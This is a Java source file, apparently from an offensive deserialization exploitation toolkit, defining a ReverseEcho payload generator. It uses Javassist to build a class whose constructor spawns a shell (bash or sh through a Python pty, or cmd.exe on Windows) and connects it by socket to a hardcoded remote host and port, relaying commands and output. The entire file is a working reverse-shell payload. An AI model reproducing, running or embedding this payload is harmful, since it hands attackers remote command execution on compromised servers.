package com.summersec.attack.deser.echo;

/**
 * @ClassName: ReverseEcho
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/6/22 10:18
 * @Version: v1.0.0
 * @Description:
 **/
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtNewConstructor;
import javassist.NotFoundException;

public class ReverseEcho implements EchoPayload {
    public ReverseEcho() {
    }

    @Override
    public CtClass genPayload(ClassPool pool) throws NotFoundException, CannotCompileException {
        CtClass clazz = pool.makeClass("com.summersec.x.Test" + System.nanoTime());
        if (clazz.getDeclaredConstructors().length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }

        clazz.addConstructor(CtNewConstructor.make("public ReverseEcho() throws Exception {\n        try {\n            String ip = \"1.1.1.1\";\n            String port = \"2333\";\n            String py_path = null;\n            String[] cmd;\n            if (!System.getProperty(\"os.name\").toLowerCase().contains(\"windows\")) {\n                String[] py_envs = new String[]{\"/bin/python\", \"/bin/python3\", \"/usr/bin/python\", \"/usr/bin/python3\", \"/usr/local/bin/python\", \"/usr/local/bin/python3\"};\n                for (int i = 0; i < py_envs.length; ++i) {\n                    String py = py_envs[i];\n                    if ((new java.io.File(py)).exists()) {\n                        py_path = py;\n                        break;\n                    }\n                }\n                if (py_path != null) {\n                    if ((new java.io.File(\"/bin/bash\")).exists()) {\n                        cmd = new String[]{py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/bash\\\")\"};\n                    } else {\n                        cmd = new String[]{py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/sh\\\")\"};\n                    }\n                } else {\n                    if ((new java.io.File(\"/bin/bash\")).exists()) {\n                        cmd = new String[]{\"/bin/bash\"};\n                    } else {\n                        cmd = new String[]{\"/bin/sh\"};\n                    }\n                }\n            } else {\n                cmd = new String[]{\"cmd.exe\"};\n            }\n            Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();\n            java.net.Socket s = new java.net.Socket(ip, Integer.parseInt(port));\n            java.io.InputStream pi = p.getInputStream();\n            java.io.InputStream pe = p.getErrorStream();\n            java.io.InputStream si = s.getInputStream();\n            java.io.OutputStream po = p.getOutputStream();\n            java.io.OutputStream so = s.getOutputStream();\n            while (!s.isClosed()) {\n                while (pi.available() > 0) {\n                    so.write(pi.read());\n                }\n                while (pe.available() > 0) {\n                    so.write(pe.read());\n                }\n                while (si.available() > 0) {\n                    po.write(si.read());\n                }\n                so.flush();\n                po.flush();\n                Thread.sleep(50L);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {\n                }\n            }\n            p.destroy();\n            s.close();\n        } catch (Throwable e) {\n            e.printStackTrace();\n        }\n    }", clazz));
        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);

        return clazz;
    }
}
